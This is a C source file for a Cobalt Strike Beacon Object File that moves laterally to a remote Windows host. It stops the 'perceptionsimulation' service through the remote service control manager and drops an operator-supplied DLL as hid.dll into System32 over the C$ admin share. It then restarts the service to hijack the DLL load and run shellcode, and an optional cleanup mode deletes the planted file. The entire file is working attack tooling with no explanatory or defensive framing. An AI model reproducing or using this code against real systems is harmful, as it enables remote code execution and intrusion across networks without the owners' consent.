#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenSCManagerA(LPCSTR, LPCSTR, DWORD);
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenServiceA(SC_HANDLE, LPCSTR, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$StartServiceA(SC_HANDLE, DWORD, LPCSTR);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ControlService(SC_HANDLE, DWORD, LPSERVICE_STATUS);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$QueryServiceStatusEx(SC_HANDLE, SC_STATUS_TYPE, LPBYTE, DWORD, LPDWORD);
DECLSPEC_IMPORT int WINAPI MSVCRT$strcmp(const char*, const char*);
DECLSPEC_IMPORT char* WINAPI MSVCRT$strcat(char*, const char*);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$DeleteFileA(LPCSTR);
DECLSPEC_IMPORT BOOL WINAPI SHLWAPI$PathFileExistsA(LPCSTR);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT VOID WINAPI KERNEL32$Sleep(DWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetTickCount();
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError();

void go(char * args, int alen) {
	// Initialize variables
	datap parser;
	char* targetHost;
	char* option;
	char* dllPath[100] = {0};
	char* dllData;
	int dllDataLen;
	DWORD errorcode;
	
	// Parse Beacon Arguments
	BeaconDataParse(&parser, args, alen);
	targetHost = BeaconDataExtract(&parser, NULL);
	option = BeaconDataExtract(&parser, NULL);
	dllDataLen = BeaconDataLength(&parser);
	dllData = BeaconDataExtract(&parser, NULL);
	MSVCRT$strcat((char*)dllPath, "\\\\");
	MSVCRT$strcat((char*)dllPath, targetHost);
	MSVCRT$strcat((char*)dllPath, "\\C$\\Windows\\System32\\PerceptionSimulation\\hid.dll");
	SERVICE_STATUS_PROCESS ssStatus; 
	DWORD dwBytesNeeded;
	DWORD dwWrite=0;
		
	BeaconPrintf(CALLBACK_OUTPUT, "Connecting to %s...", targetHost);
	
	// Get handle to the specified service control manager database
	BeaconPrintf(CALLBACK_OUTPUT, "Getting service control manager database...");
	SC_HANDLE scManager = ADVAPI32$OpenSCManagerA(targetHost, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
	if(scManager == NULL){
		errorcode = KERNEL32$GetLastError();
		if(errorcode == 1722){
			BeaconPrintf(CALLBACK_ERROR, "RPC server is unavailable.");
			return;
		}else{
			BeaconPrintf(CALLBACK_ERROR, "Error %ld: OpenSCManagerA failed.", KERNEL32$GetLastError());
			return;
		}
	}
	BeaconPrintf(CALLBACK_OUTPUT, "SCManager handle 0x%p.", scManager);

	// Get handle to the specific service
	BeaconPrintf(CALLBACK_OUTPUT, "Getting \"perceptionsimulation\" service handle...");
	SC_HANDLE scService = ADVAPI32$OpenServiceA(scManager, "perceptionsimulation", SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_STOP);
	if(scService == NULL){
		BeaconPrintf(CALLBACK_ERROR, "Error %ld: OpenServiceA failed.", KERNEL32$GetLastError());
		goto FileCleanup;
	}
	BeaconPrintf(CALLBACK_OUTPUT, "Service handle 0x%p.", scService);
	
	// Get service status
	if (!ADVAPI32$QueryServiceStatusEx(scService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssStatus, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded)){
		BeaconPrintf(CALLBACK_ERROR, "Error %ld: QueryServiceStatusEx failed.", KERNEL32$GetLastError());
		goto FileCleanup;
	}

	// Clean up mode
	if(!MSVCRT$strcmp(option, "cleanup")){
		// Stop the perceptionsimulation service
		if(ssStatus.dwCurrentState != SERVICE_STOPPED){
			BeaconPrintf(CALLBACK_OUTPUT, "Stopping service...");
			if (!ADVAPI32$ControlService(scService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssStatus)){
				BeaconPrintf(CALLBACK_ERROR, "Error %ld: Service could not be stopped.", KERNEL32$GetLastError());
				goto FileCleanup;
			}
			DWORD dwStartTime = KERNEL32$GetTickCount();
			DWORD dwTimeout = 30000;
			while (ssStatus.dwCurrentState != SERVICE_STOPPED){
				KERNEL32$Sleep(ssStatus.dwWaitHint);
				if (!ADVAPI32$QueryServiceStatusEx(scService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssStatus, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded)){
					BeaconPrintf(CALLBACK_ERROR, "Error %ld: QueryServiceStatusEx failed.", KERNEL32$GetLastError());
					goto FileCleanup;
				}
				if (ssStatus.dwCurrentState == SERVICE_STOPPED){
					break;
				}
				if (KERNEL32$GetTickCount() - dwStartTime > dwTimeout){
					BeaconPrintf(CALLBACK_OUTPUT, "Wait time out.");
					goto FileCleanup;
				}
		    	}
			BeaconPrintf(CALLBACK_OUTPUT, "\"perceptionsimulation\" service is stopped successfully.");
			KERNEL32$Sleep(5000);
		}else{
			BeaconPrintf(CALLBACK_OUTPUT, "Service is not running.");
		}
		goto FileCleanup;
		
	}
	
	// Force mode
	if(MSVCRT$strcmp(option, "force")){
		if(ssStatus.dwCurrentState != SERVICE_STOPPED && ssStatus.dwCurrentState != SERVICE_STOP_PENDING)
		{
			BeaconPrintf(CALLBACK_ERROR, "The service is already running. Please add \"force\" argument if you want to restart the service.");
			goto Cleanup;
		}
	}else{
		// Stop the perceptionsimulation service
		if(ssStatus.dwCurrentState != SERVICE_STOPPED){
			BeaconPrintf(CALLBACK_OUTPUT, "Stopping service...");
			if (!ADVAPI32$ControlService(scService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssStatus)){
				BeaconPrintf(CALLBACK_ERROR, "Error %ld: Service could not be stopped.", KERNEL32$GetLastError());
				goto FileCleanup;
			}
			DWORD dwStartTime = KERNEL32$GetTickCount();
			DWORD dwTimeout = 30000;
			while (ssStatus.dwCurrentState != SERVICE_STOPPED){
				KERNEL32$Sleep(ssStatus.dwWaitHint);
				if (!ADVAPI32$QueryServiceStatusEx(scService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssStatus, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded)){
					BeaconPrintf(CALLBACK_ERROR, "Error %ld: QueryServiceStatusEx failed.", KERNEL32$GetLastError());
					goto FileCleanup;
				}
				if (ssStatus.dwCurrentState == SERVICE_STOPPED){
					break;
				}
				if (KERNEL32$GetTickCount() - dwStartTime > dwTimeout){
					BeaconPrintf(CALLBACK_ERROR, "Wait time out.");
					goto FileCleanup;
				}
		    	}
			BeaconPrintf(CALLBACK_OUTPUT, "\"perceptionsimulation\" service is stopped successfully.");
		}
	}

	// Write file to disk
	BeaconPrintf(CALLBACK_OUTPUT, "Writing DLL payload to \"%s\" with size %i...", dllPath, dllDataLen-4);
        HANDLE hwFile = KERNEL32$CreateFileA((LPCSTR)dllPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(hwFile == NULL || hwFile == INVALID_HANDLE_VALUE){
		BeaconPrintf(CALLBACK_ERROR,"Error %ld: CreateFileA failed.", KERNEL32$GetLastError());
		KERNEL32$CloseHandle(hwFile);
		goto Cleanup;
        }else{
		KERNEL32$WriteFile(hwFile, dllData, dllDataLen-4, &dwWrite, NULL);
		if(dwWrite==0){
			BeaconPrintf(CALLBACK_ERROR,"Error %ld: WriteFile failed.", KERNEL32$GetLastError());
			KERNEL32$CloseHandle(hwFile);
			goto Cleanup;
		}else{
			BeaconPrintf(CALLBACK_OUTPUT, "DLL payload is dropped to disk successfully.");
		}
	}
	KERNEL32$CloseHandle(hwFile);

	// Start the perceptionsimulation service
	BeaconPrintf(CALLBACK_OUTPUT, "Starting service...");
	if(ADVAPI32$StartServiceA(scService, 0, NULL)){
		BeaconPrintf(CALLBACK_OUTPUT, "\"perceptionsimulation\" service is started successfully. Shellcode should be executed.");
	}else{
		BeaconPrintf(CALLBACK_ERROR, "Error %ld: Service could not be started.", KERNEL32$GetLastError());
		goto FileCleanup;
	}
	goto Cleanup;

	// Clean up DLL payload
	FileCleanup:
		if(SHLWAPI$PathFileExistsA((LPCSTR)dllPath)){
			BeaconPrintf(CALLBACK_OUTPUT, "Cleaning up \"%s\"...", dllPath);
			if(KERNEL32$DeleteFileA((LPCSTR)dllPath)){
				BeaconPrintf(CALLBACK_OUTPUT, "File is successfully deleted.");
			}else{
				errorcode = KERNEL32$GetLastError();
				if(errorcode == 32){
					BeaconPrintf(CALLBACK_ERROR, "Error %ld: File could not be deleted because the file is open by another program.", errorcode);
				}else{
					BeaconPrintf(CALLBACK_ERROR, "Error %ld: File could not be deleted.", errorcode);
				}
			}
		}else{
			BeaconPrintf(CALLBACK_OUTPUT, "The file does not exist.");
		}

	// Clean up service handles
	Cleanup:
		BeaconPrintf(CALLBACK_OUTPUT, "Cleaning up handle...");
		ADVAPI32$CloseServiceHandle(scManager);
		ADVAPI32$CloseServiceHandle(scService);
		BeaconPrintf(CALLBACK_OUTPUT, "Quiting...");
		return;
}